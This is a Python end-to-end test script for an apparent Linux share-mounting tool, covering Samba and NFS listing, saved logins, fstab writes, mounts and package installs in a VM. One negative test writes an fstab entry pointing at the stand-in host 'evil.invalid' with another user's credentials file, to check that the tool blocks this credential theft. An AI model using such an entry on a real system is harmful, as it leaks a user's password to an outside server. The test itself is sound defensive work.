#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-3.0-or-later
"""Network shares end to end (SPEC §11), run by tests/vm/shares.sh.

Inside the VM: a Samba share that needs a login, a guest share and an NFS export. Then,
if ANCHORAGE_NAS_ENV points at a private file with NAS_HOST, NAS_USER and NAS_PASSWORD,
the developer's NAS (test_share over SMB, /mnt/NAS_Pool/TVshows over NFS).

Everything goes through the GUI's own code: share listing (anchorage_client), saved logins,
fstab writes and mounts through the installed helper with real polkit prompts on tty3,
and PackageKit for installing a missing cifs-utils. Passwords never appear on a command
line or on screen: they reach the client through a short-lived step file's environment.
"""
import os
import re
import secrets
import sys
import time

from e2e_scenarios import PASSWORDS, Console, add_line, backups, check, create_users, put_file, results, ssh, vm_fstab
from editor_scenarios import fs_at

SMB_USER = "smbtest"
SMB_PASSWORD = secrets.token_urlsafe(15)


def nas_details():
    path = os.environ.get("ANCHORAGE_NAS_ENV", "")
    out = {}
    if path and os.path.exists(path):
        for line in open(path, encoding="utf-8"):
            if line.startswith("NAS_") and "=" in line:
                k, v = line.strip().split("=", 1)
                out[k] = v.strip().strip("'\"")
    return out if {"NAS_HOST", "NAS_USER", "NAS_PASSWORD"} <= out.keys() else None


def setup_servers():
    # restrict anonymous = 2: listing shares needs a login too (like the developer's NAS).
    conf = ("[global]\n  map to guest = Bad User\n  restrict anonymous = 2\n  server min protocol = SMB2\n"
            "[anchorage]\n  path = /srv/anchorage-smb\n  valid users = smbtest\n  read only = no\n"
            "[public]\n  path = /srv/anchorage-public\n  guest ok = yes\n  read only = yes\n")
    r = ssh("set -e\n"
            "sudo mkdir -p /srv/anchorage-smb /srv/anchorage-public /srv/anchorage-nfs\n"
            "sudo chmod 777 /srv/anchorage-smb /srv/anchorage-nfs\n"
            "echo public-file | sudo tee /srv/anchorage-public/readme.txt >/dev/null\n"
            "id smbtest >/dev/null 2>&1 || sudo useradd -M -s /usr/sbin/nologin smbtest\n"
            "sudo tee /etc/samba/smb.conf >/dev/null <<'EOF'\n" + conf + "EOF\n"
            "echo '/srv/anchorage-nfs 127.0.0.1(rw,no_subtree_check,insecure)' | sudo tee /etc/exports >/dev/null\n"
            "sudo systemctl restart smbd nfs-server\nsudo exportfs -ra\n")
    assert r.returncode == 0, r.stderr
    r = ssh(f"sudo smbpasswd -s -a {SMB_USER} >/dev/null", stdin=f"{SMB_PASSWORD}\n{SMB_PASSWORD}\n")
    assert r.returncode == 0, "smbpasswd failed"


def shares_in(output):
    return re.findall(r"^SHARE (.+)$", output, re.M)


def main():
    print("Creating test users and the Samba/NFS servers in the VM...")
    create_users()
    setup_servers()
    con = Console()

    # ---- listing (as the person; no helper) -------------------------------------------
    r = ssh("anchorage-e2e-client list-shares 127.0.0.1 smb")
    check("SMB without a login: 'needs a login'", "RESULT error smb1" in r.stdout, r.stdout)
    r = ssh(f"ANCHORAGE_E2E_PASSWORD='{SMB_PASSWORD}' anchorage-e2e-client list-shares 127.0.0.1 smb {SMB_USER}")
    check("SMB with the login lists both shares", {"anchorage", "public"} <= set(shares_in(r.stdout)), r.stdout)
    r = ssh("anchorage-e2e-client list-shares 127.0.0.1 nfs")
    check("NFS export listed, with the versions offered", "/srv/anchorage-nfs" in shares_in(r.stdout)
          and re.search(r"^VERSIONS .*4.*3", r.stdout, re.M), r.stdout)

    # ---- saved login + fstab + mount (dana, driveadmins) -------------------------------
    con.login("dana")
    res, prompts = con.run(f"save-login 127.0.0.1 {SMB_USER}", "dana", PASSWORDS["dana"], env={"ANCHORAGE_E2E_PASSWORD": SMB_PASSWORD})
    cred = f"/etc/anchorage/credentials/dana-127.0.0.1-{SMB_USER}"
    st = ssh(f"sudo stat -c %U:%a {cred}; sudo stat -c %a /etc/anchorage/credentials").stdout.split()
    check("dana saves the SMB login: root-only file in a root-only folder", res.startswith("RESULT ok") and cred in res
          and st == ["root:600", "700"] and prompts == ["password"], f"{res} {st}")
    rc = ssh(f"sudo -u dana cat {cred}").returncode
    check("dana herself can't read the saved password", rc != 0)
    check("the password is in no log", SMB_PASSWORD not in ssh("sudo journalctl -b --no-pager 2>/dev/null").stdout)

    res, _ = con.run(f"edit //127.0.0.1/anchorage /mnt/e2e-smb cifs request admins opt=credentials={cred}", "dana", PASSWORDS["dana"])
    check("the share is added with credentials=, no password in fstab",
          res.startswith("RESULT ok") and f"credentials={cred}" in vm_fstab() and SMB_PASSWORD not in vm_fstab(), res)
    res, _ = con.run("mount-entry /mnt/e2e-smb", "dana", PASSWORDS["dana"])
    ssh("echo via-cifs | sudo tee /mnt/e2e-smb/hello.txt >/dev/null")
    check("it mounts with the saved login and writes reach the server", res.startswith("RESULT ok") and fs_at("/mnt/e2e-smb") == "cifs"
          and ssh("cat /srv/anchorage-smb/hello.txt").stdout.strip() == "via-cifs", res)

    res, _ = con.run("edit 127.0.0.1:/srv/anchorage-nfs /mnt/e2e-nfs nfs request admins", "dana", PASSWORDS["dana"])
    res2, _ = con.run("mount-entry /mnt/e2e-nfs", "dana", PASSWORDS["dana"])
    vers = ssh("findmnt -n -o FSTYPE,OPTIONS --mountpoint /mnt/e2e-nfs").stdout
    check("NFS (Automatic) negotiates version 4", res.startswith("RESULT ok") and res2.startswith("RESULT ok") and vers.startswith("nfs4")
          and "vers=4" in vers, f"{res} {res2} {vers}")
    con.run("unmount /mnt/e2e-nfs", "dana", PASSWORDS["dana"])
    res, _ = con.run("edit 127.0.0.1:/srv/anchorage-nfs /mnt/e2e-nfs nfs request admins opt=vers=3", "dana", PASSWORDS["dana"])
    res2, _ = con.run("mount-entry /mnt/e2e-nfs", "dana", PASSWORDS["dana"])
    vers = ssh("findmnt -n -o OPTIONS --mountpoint /mnt/e2e-nfs").stdout
    check("and version 3 when chosen", res2.startswith("RESULT ok") and "vers=3" in vers, f"{res} {res2} {vers}")
    con.run("unmount /mnt/e2e-nfs", "dana", PASSWORDS["dana"])

    res, _ = con.run("mount-temp //127.0.0.1/public /mnt/e2e-guest cifs guest,ro", "dana", PASSWORDS["dana"])
    check("Mount At: the guest share, read-only, fstab unchanged", res.startswith("RESULT ok")
          and ssh("cat /mnt/e2e-guest/readme.txt").stdout.strip() == "public-file" and "/mnt/e2e-guest" not in vm_fstab(), res)
    con.run("unmount /mnt/e2e-guest", "dana", PASSWORDS["dana"])

    # ---- a password typed into fstab leaves the backups when it leaves fstab -----------
    current = vm_fstab()
    leaky = "//127.0.0.1/anchorage /mnt/e2e-leak cifs username=smbtest,password=" + SMB_PASSWORD + ",noauto,nofail 0 0"
    f = put_file("dana", "leak1", add_line(current, leaky))
    res1, _ = con.run(f"write {f}", "dana", PASSWORDS["dana"])
    f = put_file("dana", "leak2", add_line(vm_fstab(), "tmpfs /mnt/e2e-t tmpfs noauto,nofail 0 0"))
    res2, _ = con.run(f"write {f}", "dana", PASSWORDS["dana"])
    had = ssh(f"sudo sh -c \"grep -l -- '{SMB_PASSWORD}' /etc/anchorage/backups/*\" | wc -l").stdout.strip()
    f = put_file("dana", "leak3", vm_fstab().replace(f"username=smbtest,password={SMB_PASSWORD}", f"credentials={cred}"))
    res3, _ = con.run(f"write {f}", "dana", PASSWORDS["dana"])
    left = ssh(f"sudo sh -c \"grep -l -- '{SMB_PASSWORD}' /etc/anchorage/backups/* /etc/fstab\" 2>/dev/null | wc -l").stdout.strip()
    perms = ssh("stat -c %a /etc/anchorage /etc/anchorage/backups").stdout.split()
    check("moving a typed password out of fstab removes it from every backup too",
          all(r.startswith("RESULT ok") for r in (res1, res2, res3)) and int(had) >= 1 and left == "0", f"had={had} left={left}")
    check("saving a login first left /etc/anchorage and its backups readable by everyone", perms == ["755", "755"], perms)
    con.logout()

    # ---- a standard user ----------------------------------------------------------------
    con.login("alice")
    res, _ = con.run(f"save-login 127.0.0.1 {SMB_USER}", "sam", PASSWORDS["sam"], env={"ANCHORAGE_E2E_PASSWORD": SMB_PASSWORD})
    check("alice can't save logins, even with sam's password", res.startswith("RESULT error"), res)
    f = put_file("alice", "steal", add_line(vm_fstab(), f"//evil.invalid/x /mnt/e2e-steal cifs credentials={cred},noauto,nofail 0 0"))
    res, _ = con.run(f"write {f}", "sam", PASSWORDS["sam"])
    check("alice can't use dana's saved login (it would send dana's password to any server)",
          res.startswith("RESULT error") and "/mnt/e2e-steal" not in vm_fstab(), res)
    con.logout()

    # ---- cifs-utils missing: PackageKit installs it ------------------------------------
    con.login("dana")
    con.run("unmount /mnt/e2e-smb", "dana", PASSWORDS["dana"])
    ssh("sudo env DEBIAN_FRONTEND=noninteractive apt-get remove -y -q cifs-utils >/dev/null 2>&1")
    check("cifs-utils removed for the test", ssh("test -e /usr/sbin/mount.cifs && echo yes").stdout.strip() != "yes")
    res, _ = con.run("mount-entry /mnt/e2e-smb", "dana", PASSWORDS["dana"])
    check("mounting an SMB share without cifs-utils fails", res.startswith("RESULT error"), res)
    con.logout()
    con.login("sam")  # installing software needs an administrator (PackageKit's own polkit rule)
    res, prompts = con.run("install-tool smb", "sam", PASSWORDS["sam"])
    check("PackageKit installs cifs-utils", res.startswith("RESULT ok") and ssh("test -e /usr/sbin/mount.cifs && echo yes").stdout.strip() == "yes",
          f"{res} {prompts}")
    con.logout()
    con.login("dana")
    res, _ = con.run("mount-entry /mnt/e2e-smb", "dana", PASSWORDS["dana"])
    check("... and the share mounts again", res.startswith("RESULT ok") and fs_at("/mnt/e2e-smb") == "cifs", res)
    con.run("unmount /mnt/e2e-smb", "dana", PASSWORDS["dana"])

    # ---- the developer's NAS ------------------------------------------------------------
    nas = nas_details()
    if not nas:
        print("(ANCHORAGE_NAS_ENV not set: skipping the NAS scenarios)")
    else:
        host, user, pw = nas["NAS_HOST"], nas["NAS_USER"], nas["NAS_PASSWORD"]
        r = ssh(f"ANCHORAGE_E2E_PASSWORD=\"$(cat)\" anchorage-e2e-client list-shares {host} smb {user}", stdin=pw)
        check("NAS: SMB shares listed with the NAS login", "test_share" in shares_in(r.stdout), r.stdout)
        r = ssh(f"anchorage-e2e-client list-shares {host} nfs")
        check("NAS: TVshows export listed, NFS 4 and 3 offered", "/mnt/NAS_Pool/TVshows" in shares_in(r.stdout)
              and re.search(r"^VERSIONS 4,3$", r.stdout, re.M), r.stdout)
        res, _ = con.run(f"save-login {host} {user}", "dana", PASSWORDS["dana"], env={"ANCHORAGE_E2E_PASSWORD": pw})
        ncred = f"/etc/anchorage/credentials/dana-{host}-{user}"
        res2, _ = con.run(f"edit //{host}/test_share /mnt/nas-smb cifs request admins opt=credentials={ncred}", "dana", PASSWORDS["dana"])
        res3, _ = con.run("mount-entry /mnt/nas-smb", "dana", PASSWORDS["dana"])
        count = ssh("ls '/mnt/nas-smb/TVshows/The Big Bang Theory/Season 5' | wc -l").stdout.strip()
        ssh("echo anchorage | sudo tee /mnt/nas-smb/anchorage-test.txt >/dev/null")
        wrote = ssh("cat /mnt/nas-smb/anchorage-test.txt").stdout.strip()
        ssh("sudo rm -f /mnt/nas-smb/anchorage-test.txt")
        check("NAS SMB: mounted with the saved login, Season 5 has 73 files, writing works",
              all(x.startswith("RESULT ok") for x in (res, res2, res3)) and count == "73" and wrote == "anchorage", f"{res3} count={count}")
        con.run("unmount /mnt/nas-smb", "dana", PASSWORDS["dana"])
        res, _ = con.run(f"edit {host}:/mnt/NAS_Pool/TVshows /mnt/nas-nfs nfs request admins", "dana", PASSWORDS["dana"])
        res2, _ = con.run("mount-entry /mnt/nas-nfs", "dana", PASSWORDS["dana"])
        info = ssh("findmnt -n -o FSTYPE,OPTIONS --mountpoint /mnt/nas-nfs").stdout
        count = ssh("ls '/mnt/nas-nfs/TVshows/The Big Bang Theory/Season 5' | wc -l").stdout.strip()
        check("NAS NFS (Automatic): negotiates 4.2, Season 5 has 73 files", res2.startswith("RESULT ok") and "vers=4.2" in info and count == "73",
              f"{res} {res2} {info[:60]} count={count}")
        con.run("unmount /mnt/nas-nfs", "dana", PASSWORDS["dana"])
    con.logout()

    failed = [r for r in results if not r[1]]
    ssh("sudo chvt 1")
    print(f"\n{len(results) - len(failed)}/{len(results)} scenarios passed")
    return 1 if failed else 0


if __name__ == "__main__":
    sys.exit(main())
